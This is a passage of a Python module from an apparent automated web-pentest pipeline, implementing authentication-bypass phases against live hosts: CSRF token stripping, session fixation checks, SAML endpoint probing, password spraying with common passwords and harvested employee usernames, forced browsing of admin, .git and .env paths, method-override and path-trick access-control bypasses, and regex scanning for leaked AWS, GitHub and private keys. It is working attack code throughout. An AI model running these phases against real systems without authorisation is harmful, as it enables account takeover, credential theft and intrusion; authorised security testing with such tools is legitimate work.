"""Authentication bypass phases: CSRF, session fixation, SAML, password spray, forced browsing, etc."""
from reconchain.phases.helpers import *


async def phase_90_CSRF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"90-CSRF"}:
        return {}
    _out = outdir / "csrf_findings.txt"
    if _out.exists() and not force:
        return {"90-CSRF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 90-CSRF: CSRF token detection and bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "90-CSRF: no URLs; skipping")
        return {"90-CSRF": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    csrf_token_names = {"csrf", "token", "_token", "authenticity_token", "nonce",
                        "__requestverificationtoken", "csrfmiddlewaretoken", "xsrf"}
    form_urls = [u for u in all_urls if "=" in u or "/form" in u.lower() or "/submit" in u.lower()
                 or "/login" in u.lower() or "/register" in u.lower() or "/contact" in u.lower()]
    tested = 0
    for url in form_urls[:_PIPELINE_CFG.sample_urls_csrf]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            form_tags = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
            for form_content in form_tags:
                inputs = re.findall(r'<input[^>]+>', form_content, re.I)
                tokens_found: Dict[str, str] = {}
                for inp in inputs:
                    name_match = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                    val_match = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                    type_match = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
                    if name_match and val_match:
                        name_lower = name_match.group(1).lower()
                        if any(t in name_lower for t in csrf_token_names):
                            tokens_found[name_match.group(1)] = val_match.group(1)
                            if type_match and type_match.group(1).lower() == "hidden":
                                findings.append(f"[csrf-token-present] {url} — hidden field: {name_match.group(1)}")
                if tokens_found:
                    for field_name, field_val in tokens_found.items():
                        test_url = url
                        parsed_url = urllib.parse.urlparse(test_url)
                        qs = urllib.parse.parse_qs(parsed_url.query)
                        qs[field_name] = [""]
                        new_query = urllib.parse.urlencode(qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                        await _throttle_rate()
                        try:
                            req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                            if s2 in (200, 302):
                                findings.append(f"[csrf-bypass] {url} — empty {field_name} accepted (HTTP {s2})")
                        except Exception:
                            pass
                else:
                    post_forms = [f for f in form_tags if 'method="post"' in f.lower() or "method='post'" in f.lower()]
                    if post_forms:
                        findings.append(f"[csrf-missing] {url} — POST form without CSRF token")
            if "?" in url and any(t in url.lower() for t in csrf_token_names):
                findings.append(f"[csrf-in-url] {url} — CSRF token in GET parameter")
            tested += 1
        except Exception:
            continue
    if not findings:
        findings.append(f"[csrf] {tested} URLs tested, no CSRF issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"90-CSRF: {len(findings)} findings → {out}")
    return {"90-CSRF": str(_out), "count": len(findings)}


async def phase_91_SESSIONFIX(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"91-SESSIONFIX"}:
        return {}
    _out = outdir / "session_fixation.txt"
    if _out.exists() and not force:
        return {"91-SESSIONFIX": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 91-SESSIONFIX: session fixation testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "91-SESSIONFIX: no URLs; skipping")
        return {"91-SESSIONFIX": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    login_urls = [u for u in all_urls if any(m in u.lower() for m in
                  ("/login", "/signin", "/auth", "/session", "/account/signin"))]
    if not login_urls:
        login_urls = [u for u in all_urls if "/api/" in u.lower()][:5]
    for url in login_urls[:_PIPELINE_CFG.sample_hosts_sessionfix]:
        await _throttle_rate()
        try:
            import http.cookiejar
            cj = http.cookiejar.CookieJar()
            opener_cj = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            opener_cj.open(req, timeout=10)
            pre_cookies = {c.name: c.value for c in cj}
            if not pre_cookies:
                findings.append(f"[no-session-pre] {url} — no session cookie before auth")
                continue
            parsed = urllib.parse.urlparse(url)
            post_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            post_data = urllib.parse.urlencode({"username": "test", "password": "test"}).encode()
            req2 = urllib.request.Request(post_url, data=post_data,
                                         headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded", **_extra_h})
            try:
                opener_cj.open(req2, timeout=10)
            except Exception:
                pass
            post_cookies = {c.name: c.value for c in cj}
            if pre_cookies == post_cookies and pre_cookies:
                findings.append(f"[session-fixation] {url} — session cookie unchanged after auth attempt")
            elif pre_cookies and post_cookies:
                changed = [k for k in pre_cookies if k in post_cookies and pre_cookies[k] != post_cookies[k]]
                if changed:
                    findings.append(f"[session-rotated] {url} — cookie(s) rotated: {', '.join(changed)}")
        except Exception:
            continue
    if not findings:
        findings.append("[session-fixation] No login endpoints tested")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"91-SESSIONFIX: {len(findings)} findings → {out}")
    return {"91-SESSIONFIX": str(_out), "count": len(findings)}


async def phase_92_SAML(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"92-SAML"}:
        return {}
    _out = outdir / "saml_findings.txt"
    if _out.exists() and not force:
        return {"92-SAML": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 92-SAML: SAML misconfiguration attacks")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "92-SAML: no URLs; skipping")
        return {"92-SAML": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    saml_paths = ["/saml/acs", "/saml/sso", "/saml/login", "/saml/metadata",
                  "/adfs/ls/", "/simplesaml", "/saml2/acs", "/idp/sso",
                  "/saml/slo", "/oauth2/saml"]
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    saml_endpoints: List[str] = []
    for base in hosts:
        for path in saml_paths:
            saml_endpoints.append(f"{base}{path}")
    for ep in saml_endpoints[:_PIPELINE_CFG.sample_endpoints_saml]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(ep, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if status in (200, 302, 405):
                findings.append(f"[saml-endpoint] {ep} — accessible (HTTP {status})")
                if "saml" in body.lower() or "samlresponse" in body.lower():
                    findings.append("  → SAML response form detected")
            if status == 200 and "xml" in body.lower()[:100]:
                if "<Signature" not in body and "<samlp:Response" in body:
                    findings.append(f"[saml-no-signature] {ep} — SAML metadata without signature")
        except Exception:
            continue
    if not findings:
        findings.append("[saml] No SAML endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"92-SAML: {len(findings)} findings → {out}")
    return {"92-SAML": str(_out), "count": len(findings)}


async def phase_93_PWDSPRAY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"93-PWDSPRAY"}:
        return {}
    _out = outdir / "password_spray_results.txt"
    if _out.exists() and not force:
        return {"93-PWDSPRAY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 93-PWDSPRAY: password spraying")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "93-PWDSPRAY: no URLs; skipping")
        return {"93-PWDSPRAY": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    common_passwords = ["Password1!", "Welcome1!", "admin123", "password1",
                        "Company2024!", "Test1234!", "welcome1", "changeme",
                        "P@ssw0rd!", "Summer2024!", "Winter2024!", "Letmein1!"]
    usernames = ["admin", "test", "support", "user", "guest"]
    emp_file = outdir / "employees.txt"
    if emp_file.exists():
        for ln in read_lines(emp_file):
            parts = ln.strip().split()
            if len(parts) >= 2:
                usernames.append(f"{parts[0]}.{parts[1]}")
    login_urls = [u for u in all_urls if any(m in u.lower() for m in
                  ("/login", "/signin", "/auth", "/api/login", "/wp-login"))]
    if not login_urls:
        log("warn", "93-PWDSPRAY: no login endpoints found")
        ensure(_out).write_text("[no login endpoints found]\n")
        return {"93-PWDSPRAY": str(_out), "count": 0}
    for url in login_urls[:3]:
        for user in usernames[:_PIPELINE_CFG.sample_users_spray]:
            for pwd in common_passwords[:5]:
                await _throttle_rate()
                try:
                    parsed = urllib.parse.urlparse(url)
                    post_data = urllib.parse.urlencode({"username": user, "password": pwd,
                                                        "user": user, "pass": pwd}).encode()
                    req = urllib.request.Request(url, data=post_data,
                                                 headers={"User-Agent": "Mozilla/5.0",
                                                          "Content-Type": "application/x-www-form-urlencoded",
                                                          **_extra_h})
                    status, resp_h, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if status in (200, 302) and ("dashboard" in body or "welcome" in body or "logout" in body):
                        findings.append(f"[weak-cred] {url} — user={user} pass={pwd} (HTTP {status})")
                    elif "locked" in body or "too many" in body or "rate limit" in body:
                        findings.append(f"[lockout-detected] {url} — account lockout after spray attempt")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[password-spray] No weak credentials found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"93-PWDSPRAY: {len(findings)} findings → {out}")
    return {"93-PWDSPRAY": str(_out), "count": len(findings)}


async def phase_94_COOKIEAUDIT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"94-COOKIEAUDIT"}:
        return {}
    _out = outdir / "cookie_audit.txt"
    if _out.exists() and not force:
        return {"94-COOKIEAUDIT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 94-COOKIEAUDIT: cookie security deep audit")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "94-COOKIEAUDIT: no URLs; skipping")
        return {"94-COOKIEAUDIT": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            base = f"{parsed.scheme}://{parsed.netloc}"
            hosts.add(base)
    for base in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_cookie]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(base, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, headers, _ = await _async_urlopen(_urlopen, req, timeout=10)
            set_cookie_headers = parse_set_cookie_headers(headers)
            for sc in set_cookie_headers:
                cookie_name = sc.split("=")[0].strip() if "=" in sc else "unknown"
                sc_lower = sc.lower()
                issues: List[str] = []
                if "httponly" not in sc_lower:
                    issues.append("missing HttpOnly")
                if "secure" not in sc_lower:
                    issues.append("missing Secure")
                if "samesite" not in sc_lower:
                    issues.append("missing SameSite")
                if "path=" not in sc_lower:
                    issues.append("no Path set")
                if "max-age" not in sc_lower and "expires" not in sc_lower:
                    issues.append("no expiration")
                if cookie_name.startswith("__host-") or cookie_name.startswith("__secure-"):
                    findings.append(f"[cookie-prefix-ok] {base} — {cookie_name} uses __Host/__Secure prefix")
                if issues:
                    findings.append(f"[cookie-weak] {base} — {cookie_name}: {', '.join(issues)}")
        except Exception:
            continue
    if not findings:
        findings.append("[cookie-audit] No cookie security issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"94-COOKIEAUDIT: {len(findings)} findings → {out}")
    return {"94-COOKIEAUDIT": str(_out), "count": len(findings)}


async def phase_95_POSTTEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"95-POSTTEST"}:
        return {}
    _out = outdir / "post_findings.txt"
    if _out.exists() and not force:
        return {"95-POSTTEST": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 95-POSTTEST: POST method endpoint testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "95-POSTTEST: no URLs; skipping")
        return {"95-POSTTEST": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_posttest]:
        await _throttle_rate()
        try:
            req_get = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s_get, _, b_get = await _async_urlopen(_urlopen, req_get, timeout=10)
            len_get = len(b_get)
        except Exception:
            continue
        payloads = [
            ("", "text/plain"),
            ("{}", "application/json"),
            ("data=test", "application/x-www-form-urlencoded"),
        ]
        for body_data, ct in payloads:
            await _throttle_rate()
            try:
                req_post = urllib.request.Request(url, data=body_data.encode(),
                                                  method="POST",
                                                  headers={"User-Agent": "Mozilla/5.0",
                                                           "Content-Type": ct, **_extra_h})
                s_post, _, b_post = await _async_urlopen(_urlopen, req_post, timeout=10)
                len_post = len(b_post)
                if s_post != s_get and s_post not in (404, 405):
                    findings.append(f"[post-diff-status] {url} — GET={s_get} POST={s_post} (Content-Type: {ct})")
                elif abs(len_post - len_get) > 100 and s_post == 200:
                    findings.append(f"[post-diff-length] {url} — GET={len_get}b POST={len_post}b (Content-Type: {ct})")
                tested += 1
            except Exception:
                continue
    if not findings:
        findings.append(f"[post-test] {tested} POST tests completed, no hidden functionality found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"95-POSTTEST: {len(findings)} findings → {out}")
    return {"95-POSTTEST": str(_out), "count": len(findings)}


async def phase_96_METHODOVERRIDE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"96-METHODOVERRIDE"}:
        return {}
    _out = outdir / "method_override_bypass.txt"
    if _out.exists() and not force:
        return {"96-METHODOVERRIDE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 96-METHODOVERRIDE: HTTP method override bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "96-METHODOVERRIDE: no URLs; skipping")
        return {"96-METHODOVERRIDE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    override_headers = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"]
    methods = ["DELETE", "PUT", "PATCH"]
    for url in all_urls[:_PIPELINE_CFG.sample_urls_methodoverride]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, method="DELETE",
                                         headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if s in (403, 405):
                for hdr in override_headers:
                    await _throttle_rate()
                    try:
                        req2 = urllib.request.Request(url, method="GET",
                                                      headers={"User-Agent": "Mozilla/5.0", hdr: "DELETE", **_extra_h})
                        s2, _, _ = await _async_urlopen_no_redirect(_urlopen, req2, timeout=10)
                        if s2 in (200, 201, 204):
                            findings.append(f"[method-override] {url} — {hdr}: DELETE bypasses {s} → {s2}")
                    except Exception:
                        pass
                await _throttle_rate()
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs["_method"] = ["DELETE"]
                    new_q = urllib.parse.urlencode(qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
                    req3 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    s3, _, _ = await _async_urlopen_no_redirect(_urlopen, req3, timeout=10)
                    if s3 in (200, 201, 204):
                        findings.append(f"[method-override-param] {url} — _method=DELETE bypasses {s} → {s3}")
                except Exception:
                    pass
        except Exception:
            continue
    if not findings:
        findings.append("[method-override] No method override bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"96-METHODOVERRIDE: {len(findings)} findings → {out}")
    return {"96-METHODOVERRIDE": str(_out), "count": len(findings)}


async def phase_97_FORCEDBROWSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"97-FORCEDBROWSE"}:
        return {}
    _out = outdir / "forced_browse.txt"
    if _out.exists() and not force:
        return {"97-FORCEDBROWSE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 97-FORCEDBROWSE: forced browsing / unauthenticated access")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "97-FORCEDBROWSE: no URLs; skipping")
        return {"97-FORCEDBROWSE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    admin_paths = ["/admin", "/admin/", "/wp-admin", "/administrator", "/console",
                   "/debug", "/phpmyadmin", "/adminer", "/backup", "/.git",
                   "/config", "/dashboard", "/manage", "/internal", "/api/admin",
                   "/server-status", "/server-info", "/.env", "/wp-config.php.bak",
                   "/robots.txt", "/sitemap.xml", "/.well-known/", "/elmah.axd",
                   "/trace.axd", "/_debug/", "/debug/vars", "/actuator"]
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    for base in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_forcedbrowse]:
        for path in admin_paths:
            await _throttle_rate()
            try:
                test_url = f"{base}{path}"
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")[:500]
                if status == 200:
                    if "login" not in body.lower() or "dashboard" in body.lower():
                        findings.append(f"[forced-browse-200] {test_url} — direct access (HTTP 200)")
                    else:
                        findings.append(f"[forced-browse-login] {test_url} — redirects to login (HTTP 200)")
                elif status == 403:
                    findings.append(f"[forced-browse-403] {test_url} — exists but forbidden")
                elif status in (301, 302) and "login" in body.lower():
                    findings.append(f"[forced-browse-redirect] {test_url} — redirects to login")
            except Exception:
                continue
    if not findings:
        findings.append("[forced-browse] No accessible admin paths found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"97-FORCEDBROWSE: {len(findings)} findings → {out}")
    return {"97-FORCEDBROWSE": str(_out), "count": len(findings)}


async def phase_98_CASEBYPASS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"98-CASEBYPASS"}:
        return {}
    _out = outdir / "case_bypass.txt"
    if _out.exists() and not force:
        return {"98-CASEBYPASS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 98-CASEBYPASS: case sensitivity access control bypass")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "98-CASEBYPASS: no URLs; skipping")
        return {"98-CASEBYPASS": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    forbidden_urls: List[str] = []
    for url in all_urls[:_PIPELINE_CFG.sample_urls_casebypass]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if status in (403, 401):
                forbidden_urls.append(url)
        except Exception:
            continue
    for url in forbidden_urls:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        segments = path.strip("/").split("/")
        variations: List[str] = []
        for seg in segments:
            if seg and seg.isalpha():
                alt = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(seg))
                if alt != seg:
                    variations.append(alt)
        if variations:
            new_path = "/" + "/".join(variations)
            test_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[case-bypass] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
        tricks = [f"/./{path}", f"//{path.lstrip('/')}", f"{path}/", f"{path};"]
        for trick in tricks[:2]:
            test_url = urllib.parse.urlunparse(parsed._replace(path=trick))
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[path-trick] {url} → {test_url} (HTTP 200)")
            except Exception:
                pass
    if not findings:
        findings.append("[case-bypass] No case sensitivity bypasses found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"98-CASEBYPASS: {len(findings)} findings → {out}")
    return {"98-CASEBYPASS": str(_out), "count": len(findings)}


async def phase_99_APIPAGE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99-APIPAGE"}:
        return {}
    _out = outdir / "api_pagination_abuse.txt"
    if _out.exists() and not force:
        return {"99-APIPAGE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99-APIPAGE: API pagination abuse testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_file = outdir / "api_specs.txt"
    if api_file.exists():
        all_urls += read_lines(api_file)
    if not all_urls:
        log("warn", "99-APIPAGE: no URLs; skipping")
        return {"99-APIPAGE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    api_urls = [u for u in all_urls if any(m in u.lower() for m in
                ("/api/", "page=", "per_page=", "limit=", "offset=", "skip=",
                 "/v1/", "/v2/", ".json"))]
    if not api_urls:
        api_urls = all_urls[:_PIPELINE_CFG.sample_urls_apipage]
    pagination_params = [
        ("page", ["-1", "0", "999999"]),
        ("per_page", ["0", "99999"]),
        ("limit", ["-1", "0"]),
        ("offset", ["-1"]),
        ("skip", ["-1"]),
    ]
    for url in api_urls[:_PIPELINE_CFG.sample_urls_apipage]:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        for param, values in pagination_params:
            for val in values:
                qs[param] = [val]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                await _throttle_rate()
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    if status == 200 and len(body) > 100:
                        try:
                            data = json.loads(body)
                            if isinstance(data, list) and len(data) > 0:
                                findings.append(f"[pagination-abuse] {test_url} — {param}={val} returned {len(data)} items")
                            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list) and len(data["data"]) > 0:
                                findings.append(f"[pagination-abuse] {test_url} — {param}={val} returned {len(data['data'])} items in .data")
                        except json.JSONDecodeError:
                            pass
                except Exception:
                    pass
    if not findings:
        findings.append("[api-page] No pagination abuse found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99-APIPAGE: {len(findings)} findings → {out}")
    return {"99-APIPAGE": str(_out), "count": len(findings)}


async def phase_99a_TABNAB(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99a-TABNAB"}:
        return {}
    _out = outdir / "reverse_tabnabbing.txt"
    if _out.exists() and not force:
        return {"99a-TABNAB": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99a-TABNAB: reverse tabnabbing detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99a-TABNAB: no URLs; skipping")
        return {"99a-TABNAB": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_tabnab]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            links = re.findall(r'<a\s[^>]*target=["\']_blank["\'][^>]*>', body, re.I)
            for link in links:
                rel_match = re.search(r'rel=["\']([^"\']*)["\']', link, re.I)
                rel_val = rel_match.group(1).lower() if rel_match else ""
                if "noopener" not in rel_val or "noreferrer" not in rel_val:
                    href_match = re.search(r'href=["\']([^"\']+)["\']', link, re.I)
                    href = href_match.group(1) if href_match else "unknown"
                    missing = []
                    if "noopener" not in rel_val:
                        missing.append("noopener")
                    if "noreferrer" not in rel_val:
                        missing.append("noreferrer")
                    findings.append(f"[tabnab] {url} — target=_blank missing {', '.join(missing)} on {href[:80]}")
            tested += 1
        except Exception:
            continue
    if not findings:
        findings.append(f"[tabnab] {tested} pages tested, no reverse tabnabbing found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99a-TABNAB: {len(findings)} findings → {out}")
    return {"99a-TABNAB": str(_out), "count": len(findings)}


async def phase_99b_APIKEYLEAK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99b-APIKEYLEAK"}:
        return {}
    _out = outdir / "api_key_leaks.txt"
    if _out.exists() and not force:
        return {"99b-APIKEYLEAK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 99b-APIKEYLEAK: API key leakage detection in responses")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "99b-APIKEYLEAK: no URLs; skipping")
        return {"99b-APIKEYLEAK": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    key_patterns = [
        ("AWS Key", re.compile(r'AKIA[0-9A-Z]{16}')),
        ("Google API", re.compile(r'AIza[0-9A-Za-z_-]{35}')),
        ("GitHub Token", re.compile(r'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghu_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|ghr_[A-Za-z0-9]{36}')),
        ("Private Key", re.compile(r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----')),
        ("Generic API Key", re.compile(r'api[_-]?key[_-]?[:=]["\']?[A-Za-z0-9]{20,}')),
        ("Generic Secret", re.compile(r'secret[_-]?key[_-]?[:=]["\']?[A-Za-z0-9]{20,}')),
        ("Bearer Token", re.compile(r'["\']Bearer\s+[A-Za-z0-9_\-\.]{20,}["\']')),
    ]
    tested = 0
    for url in all_urls[:_PIPELINE_CFG.sample_urls_apikeyleak]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            header_str = str(headers)
            for name, pattern in key_patterns:
                for match in pattern.finditer(body):
                    findings.append(f"[key-in-body] {url} — {name}: {match.group()[:60]}")
                for match in pattern.finditer(header_str):
                    findings.append(f"[key-in-header] {url} — {name}: {match.group()[:60]}")
            tested += 1
        except Exception:
            continue
    findings = list(dict.fromkeys(findings))
    if not findings:
        findings.append(f"[apikeyleak] {tested} URLs scanned, no API key leaks found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"99b-APIKEYLEAK: {len(findings)} findings → {out}")
    return {"99b-APIKEYLEAK": str(_out), "count": len(findings)}


async def phase_99c_REDIRABUSE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"99c-REDIRABUSE"}:
        return {}
    _out = outdir / "redirect_abuse.txt"
    if _out.exists() and not force:
        return {"99c-REDIRABUSE": str(_out), "count": count_nonblank(_out)}
